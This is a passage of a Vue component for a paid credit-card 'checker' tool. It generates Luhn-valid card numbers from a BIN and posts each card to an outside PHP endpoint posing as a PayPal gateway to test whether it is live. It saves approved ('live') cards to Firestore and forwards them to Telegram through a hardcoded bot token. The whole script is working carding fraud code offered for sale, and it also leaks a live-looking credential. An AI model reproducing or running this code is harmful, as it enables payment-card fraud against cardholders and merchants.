                                →</button>
                        </a>
                    </div>
                </transition>
            </div>
        </transition>

        <!-- ═══ MODAL: NO ACCESS ═════════════════════════════════ -->
        <transition name="modal-fade">
            <div v-if="showNoAccessModal" class="fixed inset-0 z-50 flex items-center justify-center px-4">
                <div class="absolute inset-0 bg-black/70 backdrop-blur-sm" @click="showNoAccessModal = false" />
                <transition name="modal-zoom">
                    <div class="relative w-full max-w-sm rounded-3xl border p-8 flex flex-col items-center gap-5 overflow-hidden text-center"
                        style="background:#020208;border-color:rgba(255,255,255,0.1);box-shadow:0 24px 80px rgba(0,0,0,0.7)">
                        <div class="pointer-events-none absolute inset-0"
                            style="background:radial-gradient(ellipse at 50% 0%,rgba(239,68,68,0.06) 0%,transparent 55%)" />
                        <span class="absolute top-3 left-3 w-3 h-3 border-l border-t border-red-500/30" />
                        <span class="absolute top-3 right-3 w-3 h-3 border-r border-t border-red-500/30" />
                        <span class="absolute bottom-3 left-3 w-3 h-3 border-l border-b border-red-500/30" />
                        <span class="absolute bottom-3 right-3 w-3 h-3 border-r border-b border-red-500/30" />
                        <button @click="showNoAccessModal = false"
                            class="absolute top-4 right-4 text-white/20 hover:text-white transition">
                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                stroke-width="2" stroke-linecap="round">
                                <line x1="18" y1="6" x2="6" y2="18" />
                                <line x1="6" y1="6" x2="18" y2="18" />
                            </svg>
                        </button>
                        <div class="relative w-12 h-12 flex items-center justify-center rounded-2xl border"
                            style="background:rgba(239,68,68,0.08);border-color:rgba(239,68,68,0.2)">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f87171"
                                stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                                <rect x="3" y="11" width="18" height="11" rx="2" />
                                <path d="M7 11V7a5 5 0 0110 0v4" />
                            </svg>
                        </div>
                        <div class="relative">
                            <h2 class="font-display text-[1.2rem] font-extrabold tracking-tight text-white mb-2">Access
                                Required
                            </h2>
                            <p class="text-[13px] text-white/40 leading-relaxed">Purchase access from <span
                                    class="text-red-400 font-bold">@yuzuuk1</span> to use this checker.</p>
                        </div>
                        <a href="https://t.me/yuzuuk1" target="_blank" rel="noopener" class="relative w-full">
                            <button @click="showNoAccessModal = false"
                                class="w-full flex items-center justify-center gap-2 py-3 rounded-xl text-[13px] font-bold text-white transition-all hover:-translate-y-px"
                                style="background:rgba(59,130,246,0.12);border:1px solid rgba(59,130,246,0.25)">Contact
                                @yuzuuk1
                                →</button>
                        </a>
                    </div>
                </transition>
            </div>
        </transition>

    </div>
</template>

<script setup>
import { ref, computed, watch, nextTick, onMounted } from 'vue'
import { doc, updateDoc, getDoc, arrayUnion, serverTimestamp, increment } from 'firebase/firestore'
import { db, auth } from '~/firebase'

/* ── audio ─────────────────────────────────────────────── */
const audioLive = ref(null)
const audioSuccess = ref(null)
const logContainer = ref(null)
const fileInput = ref(null)

/* ── checker state ──────────────────────────────────────── */
const cardsInput = ref('')
const approved = ref([])
const refused = ref([])
const loading = ref(false)
const tested = ref(0)
const loaded = ref(0)
const errors = ref(0)
const genBin = ref('')
const lastSpeed = ref('—')
const dragOver = ref(false)

/* ── user prefs loaded from Firestore ───────────────────── */
const telegramLinked = ref(false)
const telegramChatId = ref('')
const notifApproved = ref(true)   // enviar TG quando aprovado
const notifSoundEnable = ref(true)   // tocar som quando aprovado
const BOT_TOKEN = ref("8893394989:AAHn7cdj2X1DjXyXAyY2L9iE1Np2aoKZ1ZM")     // preenchido via runtimeConfig ou env

/* ── ui state ───────────────────────────────────────────── */
const showNoBalanceModal = ref(false)
const showNoAccessModal = ref(false)
const errorMessage = ref('')
const showConfig = ref(false)
const hideResults = ref(false)
const masking = ref(false)
const activeTab = ref('approved')
const consoleLogs = ref([])

/* ── tabs ───────────────────────────────────────────────── */
const resultTabs = [
    { key: 'approved', label: 'APPROVED', dotClass: 'bg-emerald-500', activeClass: 'text-emerald-400 border-emerald-500', badgeFg: 'background:rgba(34,197,94,0.1);color:#4ade80' },
    { key: 'rejected', label: 'REJECTED', dotClass: 'bg-red-500', activeClass: 'text-red-400 border-red-500', badgeFg: 'background:rgba(239,68,68,0.1);color:#f87171' },
    { key: 'errors', label: 'ERRORS', dotClass: 'bg-amber-400', activeClass: 'text-amber-400 border-amber-400', badgeFg: 'background:rgba(251,191,36,0.1);color:#fbbf24' },
]

const currentList = computed(() => {
    if (activeTab.value === 'approved') return approved.value
    if (activeTab.value === 'rejected') return refused.value.filter(i => i.type === 'refused')
    return refused.value.filter(i => i.type === 'error')
})
function tab_key(item, idx) { return activeTab.value + idx }

/* ── settings ───────────────────────────────────────────── */
const settings = ref({ threads: 1, gateway: 'PayPal US', proxy: '' })

if (typeof window !== 'undefined') {
    const saved = localStorage.getItem('bwCheckerSettings')
    if (saved) { try { Object.assign(settings.value, JSON.parse(saved)) } catch { } }
}
watch(settings, v => localStorage.setItem('bwCheckerSettings', JSON.stringify(v)), { deep: true })

const gateways = [
    { id: 'us', name: 'PayPal US', abbr: '⚡', gateway: 'PayPal', charge: '———', tags: ['Visa', 'Amex', 'Discover'], online: true },
    { id: 'ca', name: 'PayPal CA', abbr: '⚡', gateway: 'PayPal', charge: '———', tags: ['Visa', 'Amex', 'Discover'], online: true },
    { id: 'bra', name: 'PayPal BR', abbr: '⚡', gateway: 'PayPal', charge: '———', tags: ['Visa', 'Amex', 'Discover'], online: true },
]

const apiMap = { 'PayPal US': 'us', 'PayPal CA': 'ca', 'PayPal BR': 'bra' }

/* ── load user prefs on mount ───────────────────────────── */
onMounted(() => {
    auth.onAuthStateChanged(async u => {
        if (!u) return
        try {
            const snap = await getDoc(doc(db, 'users', u.uid))
            if (!snap.exists()) return
            const d = snap.data()
            telegramChatId.value = d.telegramChatId || ''
            telegramLinked.value = !!(d.telegramChatId && d.telegramNotif)
            notifApproved.value = d.notifApproved ?? true
            notifSoundEnable.value = d.notifSound ?? true
            // Bot token via Firestore config doc (opcional) ou variável de ambiente do Nuxt
            // Para usar env: const config = useRuntimeConfig(); BOT_TOKEN.value = config.public.telegramBotToken
            // Para usar Firestore: buscar doc('config','telegram').token
        } catch { }
    })
})

/* ── helpers ────────────────────────────────────────────── */
function getTime() { return new Date().toLocaleTimeString('pt-BR', { hour12: false }) }
function addLog(type, text) {
    consoleLogs.value.push({ type, text, time: getTime() })
    nextTick(() => { if (logContainer.value) logContainer.value.scrollTop = logContainer.value.scrollHeight })
}
function playAudio(r) { try { r?.value?.play() } catch { } }

function maskCard(card) {
    if (!card) return ''
    const parts = card.split('|')
    const num = parts[0] || ''
    const masked = num.slice(0, 4) + 'x'.repeat(Math.max(0, num.length - 4))
    return [masked, ...parts.slice(1).map(() => 'xx')].join('|')
}

/* ── Telegram notification ──────────────────────────────── */
async function sendTelegramNotif(card, gateway, ms) {
    if (!telegramLinked.value || !notifApproved.value) return
    if (!telegramChatId.value || !BOT_TOKEN.value) return
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN.value}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: telegramChatId.value,
                parse_mode: 'HTML',
                text: `✅ <b>Card Approved!</b>\n\n<code>${card}</code>\n\n🌐 Gateway: <b>${gateway}</b>\n⚡ Speed: <b>${ms}ms</b>\n\n<i>BlackWave.xyz</i>`
            })
        })
        addLog('TG', `Notification sent → ${telegramChatId.value}`)
    } catch { /* silent fail — não interrompe o checker */ }
}

/* ── file drop / select ─────────────────────────────────── */
function onDrop(e) {
    dragOver.value = false
    const file = e.dataTransfer?.files?.[0]
    if (file) readFile(file)
}
function onFileSelected(e) {
    const file = e.target?.files?.[0]
    if (file) readFile(file)
    e.target.value = ''
}
function readFile(file) {
    const reader = new FileReader()
    reader.onload = ev => {
        const lines = (ev.target?.result || '').split(/\r?\n/).map(l => l.trim()).filter(Boolean)
        cardsInput.value = lines.join('\n')
        addLog('SYS', `Loaded ${lines.length} lines from "${file.name}".`)
    }
    reader.readAsText(file)
}

/* ── card generator ─────────────────────────────────────── */
function luhnComplete(n) {
    let arr = n.split('').reverse().map(x => parseInt(x)), s = 0
    arr.forEach((v, i) => { if (i % 2 === 0) { v *= 2; if (v > 9) v -= 9 }; s += v })
    return n + ((10 - (s % 10)) % 10)
}
function generateCards() {
    const bin = genBin.value.trim().split('|')[0]
    if (!/^[\dx]{6,}$/i.test(bin)) return
    const isAmex = /^3[47]/.test(bin)
    const cards = []
    for (let i = 0; i < 50; i++) {
        let cc = ''
        for (const c of bin) cc += c.toLowerCase() === 'x' ? Math.floor(Math.random() * 10) : c
        const baseLen = isAmex ? 14 : 15
        cc = cc.slice(0, baseLen)
        while (cc.length < baseLen) cc += Math.floor(Math.random() * 10)
        cc = luhnComplete(cc)
        const parts = genBin.value.trim().split('|')
        const mm = parts[1]?.padStart(2, '0') || String(Math.floor(Math.random() * 12) + 1).padStart(2, '0')
        const yy = parts[2]?.padStart(2, '0') || String((new Date().getFullYear() % 100) + Math.floor(Math.random() * 5) + 1).padStart(2, '0')
        const cvvLen = isAmex ? 4 : 3
        const cvv = String(Math.floor(Math.random() * 10 ** cvvLen)).padStart(cvvLen, '0')
        cards.push(`${cc}|${mm}|${yy}|${cvv}`)
    }
    cardsInput.value = cards.join('\n')
    addLog('SYS', `Generated ${cards.length} cards from BIN ${bin}.`)
}

/* ── checker ────────────────────────────────────────────── */
async function startCheck() {
    errorMessage.value = ''
    const raw = cardsInput.value.trim()
    if (!raw) { errorMessage.value = 'Paste or upload cards first.'; return }

    // ✅ Sound respects user pref
    if (notifSoundEnable.value) playAudio(audioSuccess)

    const user = auth.currentUser
    if (!user) { errorMessage.value = 'You must be logged in.'; return }

    const userRef = doc(db, 'users', user.uid)
    const userSnap = await getDoc(userRef)
    const userData = userSnap.data() || {}
    let balance = Number(userData.balance ?? 0)
    const vipAccess = userData.vipAccess ?? false
    let checksMonth = Number(userData.checksMonth ?? 0)
    let livesUsed = Number(userData.livesUsed ?? 0)
    let avgSpentWeek = Number(userData.avgSpentWeek ?? 0)

    if (balance < 0.10) { showNoBalanceModal.value = true; return }
    if (!vipAccess) { showNoAccessModal.value = true; return }

    tested.value = 0
    errors.value = 0
    approved.value = []
    refused.value = []

    const cards = raw.split('\n').map(c => c.trim()).filter(Boolean)
    loaded.value = cards.length
    loading.value = true
    addLog('SYS', `Starting check on ${cards.length} card(s). Gateway: ${settings.value.gateway} | Threads: ${settings.value.threads}×`)

    const threads = Math.max(1, Math.min(4, Number(settings.value.threads) || 1))
    let pointer = 0
    const remaining = [...cards]

    async function processCard(card) {
        if (!loading.value) return
        try {
            updateDoc(userRef, { cardsBought: increment(1) }).catch(() => { })
            const t0 = performance.now()
            const api = apiMap[settings.value.gateway] || 'us'
            const url = `https://vortexcenter.xyz/butico/${api}.php`
            const body = new URLSearchParams({ proxy: settings.value.proxy || '', lista: card }).toString()
            const res = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body })
            const text = await res.text()
            const ms = Math.round(performance.now() - t0)
            lastSpeed.value = `${ms}ms`

            let json = null
            try { json = JSON.parse(text) } catch { }

            function compact(j, raw, fb) {
                if (j) { const v = j.lista ?? fb; const c = j.code ?? ''; return c ? `${v} → ${c}` : v }
                const lm = raw?.match(/(\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4})/)
                const cm = raw?.match(/"code"\s*:\s*"([^"]+)"|code:?\s*([A-Z0-9_]+)/i)
                const v = lm ? lm[1] : fb
                const c = cm ? (cm[1] || cm[2]) : ''
                return c ? `${v} | ${c}` : v
            }

            let isApproved = false
            if (json?.status) {
                const s = String(json.status).toLowerCase()
                if (['aprovada', 'approved', 'sucesso', 'success'].includes(s)) isApproved = true
            }
            if (!isApproved && /(aprovad|approved|sucesso|success)/i.test(text)) isApproved = true

            if (isApproved) {
                const html = compact(json, text, card)
                approved.value.push({ type: 'approved', card, html })
                addLog('APR', `${html} (${ms}ms)`)

                // ✅ Sound respects user pref
                if (notifSoundEnable.value) playAudio(audioLive)

                // ✅ Telegram notification
                sendTelegramNotif(card, settings.value.gateway, ms)

                balance = Math.max(0, balance - 0.10)
                checksMonth++; livesUsed++; avgSpentWeek = Math.max(0, avgSpentWeek + 0.10)
                updateDoc(userRef, { lives: arrayUnion(card), checksMonth, livesUsed, lastCheck: serverTimestamp(), balance, avgSpentWeek }).catch(() => { })
            } else {
                const html = compact(json, text, card)
                refused.value.push({ type: 'refused', card, html })
                addLog('REJ', `${html} (${ms}ms)`)
            }
        } catch {
            errors.value++
            refused.value.push({ type: 'error', card, html: `${card} → ERROR` })
            addLog('ERR', `${card} → ERROR`)
        } finally {
            tested.value++
        }
    }

    while (pointer < cards.length && loading.value) {
        const batch = []
        for (let t = 0; t < threads && pointer < cards.length; t++, pointer++) batch.push(processCard(cards[pointer]))
        await Promise.all(batch)
        remaining.splice(0, batch.length)
        cardsInput.value = remaining.join('\n')
    }

    loading.value = false
    addLog('SYS', 'All done.')
    addLog('RES', `APR: ${approved.value.length} REJ: ${refused.value.filter(i => i.type === 'refused').length} ERR: ${errors.value} TOTAL: ${tested.value}`)
}

function pauseCheck() { loading.value = false; addLog('SYS', 'Check paused.') }
function stopCheck() { loading.value = false; addLog('SYS', 'Check stopped by user.') }
function resetAll() {
    loading.value = false
    cardsInput.value = ''; approved.value = []; refused.value = []
    tested.value = 0; loaded.value = 0; errors.value = 0
    consoleLogs.value = []; lastSpeed.value = '—'
}

function maskToggle() { masking.value = !masking.value }
function hideToggle() { hideResults.value = !hideResults.value }
function clearResults() {
    if (activeTab.value === 'approved') approved.value = []
    else if (activeTab.value === 'rejected') refused.value = refused.value.filter(i => i.type !== 'refused')
    else refused.value = refused.value.filter(i => i.type !== 'error')
}
function copyResults() { navigator.clipboard.writeText(currentList.value.map(i => i.card).join('\n')) }
function exportResults() {
    const blob = new Blob([currentList.value.map(i => i.card).join('\n')], { type: 'text/plain' })
    Object.assign(document.createElement('a'), { href: URL.createObjectURL(blob), download: `${activeTab.value}.txt` }).click()
}
function resetSettings() { settings.value = { threads: 1, gateway: 'PayPal US', proxy: '' }; localStorage.removeItem('bwCheckerSettings') }
function saveSettings() { showConfig.value = false }
</script>

<style>
@import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;1,9..40,400&display=swap');

.font-display {
    font-family: 'Syne', sans-serif
}

.font-sans {
    font-family: 'DM Sans', sans-serif
}

.font-mono {
    font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace
}

.section-block {
    border: 1px solid rgba(255, 255, 255, 0.07);
    border-radius: 16px;
    overflow: hidden;
    background: #030305
}

.section-header {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 10px 20px;
    font-size: 10px;
    font-weight: 700;
    letter-spacing: .13em;
    text-transform: uppercase;
    color: rgba(255, 255, 255, .25);
    border-bottom: 1px solid rgba(255, 255, 255, .05);
    background: rgba(255, 255, 255, .01)
}

.summary-card {
    padding: 20px 24px;
    display: flex;
    flex-direction: column;
    gap: 6px
}

.summary-label {
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 10px;
    font-weight: 700;
    letter-spacing: .12em;
    text-transform: uppercase
}

.dot {
    display: inline-block;
    width: 6px;
    height: 6px;
    border-radius: 50%;
    flex-shrink: 0
}

.action-btn {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 7px 14px;
    border-radius: 10px;
    font-size: 12px;
    font-weight: 700;
    border: 1px solid transparent;
    transition: all .15s;
    cursor: pointer;
    color: white
}

.action-btn:disabled {
    opacity: .3;
    cursor: not-allowed;
    pointer-events: none
}

.action-btn--run {
    background: rgba(59, 130, 246, .12);
    border-color: rgba(59, 130, 246, .3)
}

.action-btn--run:hover {
    background: rgba(59, 130, 246, .2);
    transform: translateY(-1px)
}

.action-btn--stop {
    background: rgba(239, 68, 68, .08);
    border-color: rgba(239, 68, 68, .2);
    color: #f87171
}

.action-btn--stop:hover {
    background: rgba(239, 68, 68, .14)
}

.action-btn--muted {
    background: rgba(255, 255, 255, .03);
    border-color: rgba(255, 255, 255, .07);
    color: rgba(255, 255, 255, .4)
}

.action-btn--muted:hover {
    background: rgba(255, 255, 255, .06);
    color: white
}

.result-tab {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 10px 16px;
    font-size: 11px;
    font-weight: 700;
    letter-spacing: .08em;
    border-bottom: 2px solid transparent;
    margin-bottom: -1px;
    transition: all .15s;
    cursor: pointer;
    background: transparent
}

.tab-badge {
    padding: 1px 6px;
    border-radius: 4px;
    font-size: 10px;
    font-weight: 700
}

.results-action-btn {
    display: inline-flex;
    align-items: center;
    gap: 5px;
    padding: 5px 9px;
    border-radius: 8px;
    font-size: 11px;
    font-weight: 600;
    color: rgba(255, 255, 255, .3);
    border: 1px solid rgba(255, 255, 255, .06);
    transition: all .15s;
    cursor: pointer;
    background: transparent
}

.results-action-btn:hover {
    color: white;
    background: rgba(255, 255, 255, .05);
    border-color: rgba(255, 255, 255, .12)
}

.results-action-btn--danger:hover {
    color: #f87171;
    background: rgba(239, 68, 68, .06);
    border-color: rgba(239, 68, 68, .15)
}

.settings-section-label {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    font-size: 10px;
    font-weight: 700;
    letter-spacing: .12em;
    text-transform: uppercase;
    color: rgba(255, 255, 255, .25)
}

.gateway-tag {
    display: inline-block;
    padding: 2px 7px;
    border-radius: 5px;
    font-size: 10px;
    font-weight: 600;
    color: rgba(96, 165, 250, .7);
    background: rgba(59, 130, 246, .08);
    border: 1px solid rgba(59, 130, 246, .15)
}

.fade-slide-enter-active,
.fade-slide-leave-active {
    transition: all .22s cubic-bezier(.4, 0, .2, 1)
}

.fade-slide-enter-from,
.fade-slide-leave-to {
    opacity: 0;
    transform: translateY(8px)
}

.modal-fade-enter-active,
.modal-fade-leave-active {
    transition: opacity .2s ease
}

.modal-fade-enter-from,
.modal-fade-leave-to {
    opacity: 0
}

.modal-zoom-enter-active,
.modal-zoom-leave-active {
    transition: all .25s cubic-bezier(.4, 2, .6, 1)
}

.modal-zoom-enter-from,
.modal-zoom-leave-to {
    opacity: 0;
    transform: scale(.94) translateY(6px)
}

html {
    scrollbar-width: thin;
    scrollbar-color: #1a1a1a #000
}

::-webkit-scrollbar {
    width: 4px;
    background: #000
}

::-webkit-scrollbar-thumb {
    background: #1e1e1e;
    border-radius: 99px
}
</style>